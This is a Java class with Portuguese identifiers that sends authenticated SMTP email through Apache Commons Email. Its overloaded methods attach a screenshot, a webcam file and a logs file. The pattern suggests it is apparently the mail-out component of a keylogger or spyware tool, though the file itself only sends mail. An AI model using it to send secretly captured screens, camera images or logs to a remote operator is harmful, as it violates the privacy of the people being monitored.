
import org.apache.commons.mail.EmailAttachment;
import org.apache.commons.mail.EmailException;
import org.apache.commons.mail.MultiPartEmail;
import org.apache.commons.mail.SimpleEmail;

import java.io.File;
import java.io.IOException;

class SendEmail {

    private String smtp; //Simple Mail Transfer Protocol
    private String emailRemetente;
    private String remetenteSenha;
    private String destinatario;
    private String assunto;
    private String msg;
    private String porta;
    private boolean ssl; // Security Socket Layer
    private boolean tls; // Transport Layer Security
    private boolean debug;

    SendEmail(String smtp, String emailRemetente, String remetenteSenha, String porta, boolean ssl, boolean tls) {
        this.smtp = smtp;
        this.emailRemetente = emailRemetente;
        this.remetenteSenha = remetenteSenha;
        this.porta = porta;
        this.ssl = ssl;
        this.tls = tls;
    }

    void sendSimpleEmail(String destinatario, String assunto, String msg) {
        SimpleEmail email = new SimpleEmail();
        try {
            email.setHostName(smtp);
            email.addTo(destinatario);
            email.setFrom(emailRemetente);
            email.setAuthentication(emailRemetente, remetenteSenha);
            email.setSubject(assunto);
            email.setMsg(msg);
            email.setSSL(ssl);
            email.setTLS(tls);
            email.send();
        } catch (EmailException e) {
            System.out.println(e.getMessage());
        }
    }

    public void sendEmailAttachment(String destinatario, String assunto, String msg, String file_screenshot, String file_cam, String file_logs) {
        File cam_file = new File(file_cam);
        if (!cam_file.exists()) {
            try {
                File new_file = new File(file_cam);
                new_file.createNewFile();
            } catch (IOException e) {
                System.out.println(e.getMessage());
            }
        }

        File fileScreenshot = new File(file_screenshot);
        EmailAttachment attachmentScreenshot = new EmailAttachment();
        attachmentScreenshot.setPath(fileScreenshot.getPath());
        attachmentScreenshot.setDisposition(EmailAttachment.ATTACHMENT);
        attachmentScreenshot.setDescription("Screenshot");
        attachmentScreenshot.setName(fileScreenshot.getName());

        File fileCam = new File(file_cam);
        EmailAttachment attachmentCam = new EmailAttachment();
        attachmentCam.setPath(fileCam.getPath());
        attachmentCam.setDisposition(EmailAttachment.ATTACHMENT);
        attachmentCam.setDescription("Cam");
        attachmentCam.setName(fileCam.getName());

        File fileLogs = new File(file_logs);
        EmailAttachment attachmentLogs = new EmailAttachment();
        attachmentLogs.setPath(fileLogs.getPath());
        attachmentLogs.setDisposition(EmailAttachment.ATTACHMENT);
        attachmentLogs.setDescription("Logs");
        attachmentLogs.setName(fileLogs.getName());

        try {
            MultiPartEmail email = new MultiPartEmail();
            email.setDebug(debug);
            email.setHostName(smtp);
            email.addTo(destinatario);
            email.setFrom(emailRemetente);
            email.setAuthentication(emailRemetente, remetenteSenha);
            email.setSubject(assunto);
            email.setMsg(msg);
            email.setSSL(true);
            email.attach(attachmentScreenshot);
            email.attach(attachmentCam);
            email.attach(attachmentLogs);
            email.send();
        } catch (EmailException e) {
            System.out.println(e.getMessage());
        }
    }

    public void sendEmailAttachment(String email_to, String assunto, String msg, String file, String file_logs) {
        File fileScreenshot = new File(file);
        EmailAttachment attachment = new EmailAttachment();
        attachment.setPath(fileScreenshot.getPath());
        attachment.setDisposition(EmailAttachment.ATTACHMENT);
        attachment.setDescription("Attachment");
        attachment.setName(fileScreenshot.getName());

        File fileLogs = new File(file_logs);
        EmailAttachment attachmentLogs = new EmailAttachment();
        attachmentLogs.setPath(fileLogs.getPath());
        attachmentLogs.setDisposition(EmailAttachment.ATTACHMENT);
        attachmentLogs.setDescription("Logs");
        attachmentLogs.setName(fileLogs.getName());

        try {
            MultiPartEmail email = new MultiPartEmail();
            email.setDebug(debug);
            email.setHostName(smtp);
            email.addTo(email_to);
            email.setFrom(emailRemetente);
            email.setAuthentication(emailRemetente, remetenteSenha);
            email.setSubject(assunto);
            email.setMsg(msg);
            email.setSSL(true);
            email.attach(attachment);
            email.attach(attachmentLogs);
            email.send();
        } catch (EmailException e) {
            System.out.println(e.getMessage());
        }
    }

    public void sendEmailAttachment(String email_to, String assunto, String msg, String file_logs) {
        File fileLogs = new File(file_logs);
        EmailAttachment attachmentLogs = new EmailAttachment();
        attachmentLogs.setPath(fileLogs.getPath());
        attachmentLogs.setDisposition(EmailAttachment.ATTACHMENT);
        attachmentLogs.setDescription("Logs");
        attachmentLogs.setName(fileLogs.getName());

        try {
            MultiPartEmail email = new MultiPartEmail();
            email.setDebug(debug);
            email.setHostName(smtp);
            email.addTo(email_to);
            email.setFrom(emailRemetente);
            email.setAuthentication(emailRemetente, remetenteSenha);
            email.setSubject(assunto);
            email.setMsg(msg);
            email.setSSL(true);
            email.attach(attachmentLogs);
            email.send();
        } catch (EmailException e) {
            System.out.println(e.getMessage());
        }
    }


}